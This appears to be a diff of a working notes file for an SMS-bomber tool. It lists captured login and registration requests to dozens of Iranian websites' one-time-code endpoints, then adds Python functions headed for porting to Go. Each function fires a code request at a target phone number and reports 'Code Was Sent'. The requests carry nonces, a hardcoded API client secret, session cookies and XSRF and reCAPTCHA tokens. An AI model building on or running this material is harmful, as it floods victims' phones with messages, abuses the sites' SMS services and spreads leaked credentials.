@@ -5,101 +5,7 @@ https://pashikshoes.com/  https://gitamehr.ir/
 
 
 
-Request URL
-https://ultraamooz.com/wp-admin/admin-ajax.php
-action
-digits_check_mob
-countrycode
-+98
-mobileNo
-912 222 1518
-csrf
-a6fd7f4d05
-login
-2
-username
-monsmain
-email
-captcha
-captcha_ses
-digits
-1
-json
-1
-whatsapp
-0
-digits_reg_name
-monsmain
-digits_reg_username
-monsmain
-digregcode
-+98
-digits_reg_mail
-912 222 1518
-digregscode2
-+98
-mobmail2
-digits_reg_password
-dig_otp
-code
-dig_reg_mail
-dig_nounce
-a6fd7f4d05
----------------------------------------------------------------
-Request URL
-https://api.pateh.com/ath/auth/login-or-register
 
-{mobile: "09122221515"}
-mobile
-: 
-"09122221515"
----------------------------------------------------------------
-Request URL
-https://aloghesti.com/wp-admin/admin-ajax.php
-
-login_digt_countrycode
-+98
-digits_phone
-9121221212
-action_type
-phone
-digits_reg_name
-monsmain
-digits_process_register
-1
-sms_otp
-otp_step_1
-1
-digits_otp_field
-1
-digits
-1
-instance_id
-14a99a5919d973c4ac4f811d93cde732
-action
-digits_forms_ajax
-type
-login
-digits_step_1_type
-digits_step_1_value
-digits_step_2_type
-digits_step_2_value
-digits_step_3_type
-digits_step_3_value
-digits_login_email_token
-digits_redirect_page
-//aloghesti.com/?page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F
-digits_form
-b3b7e8ee3b
-_wp_http_referer
-/?login=true&page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F
-show_force_title
-1
-container
-digits_protected
-sub_action
-sms_otp
----------------------------------------------------------------
 Request URL
 https://accounts.khanoumi.com/account/login/init
 
@@ -110,38 +16,7 @@ loginIdentifier
 loginSchemeName
 sms
 ---------------------------------------------------------------
-1:
-Request URL
-https://api.malltina.com/check-user
-Request Method
-POST
-Status Code
-404 Not Found
 
-{username: "09123456456"}
-username
-: 
-"09123456456"
-
-2:
-Request URL
-https://api.malltina.com/profiles
-Request Method
-POST
-Status Code
-200 OK
-
-{password: "Monsmain1", mobile: "09123456456", sign_up_referral_link: "https://www.google.com/"}
-mobile
-: 
-"09123456456"
-password
-: 
-"Monsmain1"
-sign_up_referral_link
-: 
-"https://www.google.com/"
----------------------------------------------------------------
 Request URL
 https://www.1001kharid.com/wp-admin/admin-ajax.php
 Request Method
@@ -380,83 +255,6 @@ Status Code
 password
 monsmain@
 ---------------------------------------------------------------
-1:
-Request URL
-https://market-backend.dgshahr.com/shop/user/user_login/
-Request Method
-POST
-Status Code
-200 OK
-
-{phone_number: "09128887494"}
-phone_number
-: 
-"09128887494"
-
-2:
-Request URL
-https://market-backend.dgshahr.com/shop/utils/sessions/
-Request Method
-POST
-Status Code
-200 OK
-
-{device_id: "1753380675041", user_id: null, device: "desktop",…}
-action_event
-: 
-"visit"
-device
-: 
-"desktop"
-device_dimension
-: 
-"458x826"
-device_id
-: 
-"1753380675041"
-first_visit_page
-: 
-"/plp/category/2236"
-medium
-: 
-null
-source
-: 
-null
-user_agent_original_text
-: 
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
-user_id
-: 
-null
----------------------------------------------------------------
-Request URL
-https://irani24.ir/signin?do
-Request Method
-POST
-Status Code
-200 OK
-
-do
-user_mobile
-09122221514
-confirm_code
----------------------------------------------------------------
-Request URL
-https://api.footballi.net/api/v2/user/check
-Request Method
-POST
-Status Code
-200 OK
-
-{login: "09122221515", country_code: "+98"}
-country_code
-: 
-"+98"
-login
-: 
-"09122221515"
----------------------------------------------------------------
 Request URL
 https://70kala.ir/wp-admin/admin-ajax.php
 Request Method
@@ -538,35 +336,6 @@ ajax
 1
 ---------------------------------------------------------------
 Request URL
-https://evanhamrah.com/wp-admin/admin-ajax.php
-Request Method
-POST
-Status Code
-200 OK
-
-phone_number
-09123456789
-action
-ajax_login_register
-wcp_nonce
-290a8a31b9
----------------------------------------------------------------
-Request URL
-https://user.zirbana.com/v2/register
-Request Method
-POST
-Status Code
-201 Created
-
-
-mobile
-09122221515
-client_id
-12
-client_secret
-yKrlLyr4IBxXhZSyvjKZLObsUF8iSGNhtEEcjfIr
----------------------------------------------------------------
-Request URL
 https://geminja.com/wp-json/api/sendSmsMelliPayamak
 Request Method
 POST
@@ -591,18 +360,6 @@ dlr-register
 ثبت نام
 _dlr_mobits
 register
----------------------------------------------------------------
-Request URL
-https://api.arzplus.net/api/v1/accounts/signup/init/
-Request Method
-POST
-Status Code
-200 OK
-
-{phone: "09123466456"}
-phone
-: 
-"09123466456"
 ---------------------------------------------------------------
 Request URL
 https://gooshi.online/site/api/v1/user/otp
@@ -637,6 +394,148 @@ Status Code
 
 { 'MobileNo': '09122221515'}
 ---------------------------------------------------------------
+1:
+Request URL
+https://my.limoome.com/auth/check-mobile
+Request Method
+POST
+Status Code
+200 OK
+
+{mobileNumber: "9122221515", countryId: "1"}
+countryId
+: 
+"1"
+mobileNumber
+: 
+"9122221515"
+
+2:
+Request URL
+https://my.limoome.com/lemonade/api/analytics
+Request Method
+POST
+Status Code
+201 Created
+
+{action: "get_otp", category: "click",…}
+action
+: 
+"get_otp"
+category
+: 
+"click"
+label
+: 
+"https://my.limoome.com/enter/#/?utm_source=limoome&utm_medium=site&utm_campaign=hmpglogin"
+meta
+: 
+{source: "front"}
+service
+: 
+"LIMOOME_SHOP"
+sessionId
+: 
+"cmdigluny86063dvraeusujn2p"
+
+3:
+Request URL
+https://my.limoome.com/lemonade/api/analytics
+Request Method
+POST
+Status Code
+201 Created
+
+{action: "check_mobile", category: "responded",…}
+action
+: 
+"check_mobile"
+category
+: 
+"responded"
+label
+: 
+"https://my.limoome.com/enter/#/?utm_source=limoome&utm_medium=site&utm_campaign=hmpglogin"
+meta
+: 
+{source: "front"}
+service
+: 
+"LIMOOME_SHOP"
+sessionId
+: 
+"cmdigluny86063dvraeusujn2p"
+
+4:
+Request URL
+https://my.limoome.com/api/auth/login/otp
+Request Method
+POST
+Status Code
+200 Ok
+
+
+mobileNumber
+9122221515
+country
+1
+---------------------------------------------------------------
+python code change to golang:
+
+def alibaba(phone):
+    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
+    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
+    try:
+        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
+        if alibabaR["result"]["success"] == True:
+            print(f'{g}(AliBaba) {w}Code Was Sent')
+            return True
+    except:
+        pass
+
+def okorosh(phone):
+    okJ = {
+    "mobile": "0"+phone.split("+98")[1],
+    "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
+}
+    okU = 'https://my.okcs.com/api/check-mobile'
+    okH = {'accept': 'application/json, text/plain, */*',
+'accept-encoding': 'gzip, deflate, br',
+'accept-language': 'en-US,en;q=0.9',
+'content-type': 'application/json;charset=UTF-8',
+'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
+'origin': 'https://my.okcs.com',
+'referer': 'https://my.okcs.com/',
+'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
+'x-requested-with': 'XMLHttpRequest',
+'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
+    try:
+        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
+        if 'success' in okR:
+            print(f'{g}(OfoghKourosh) {w}Code Was Sent')
+            return True
+    except:
+        pass
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
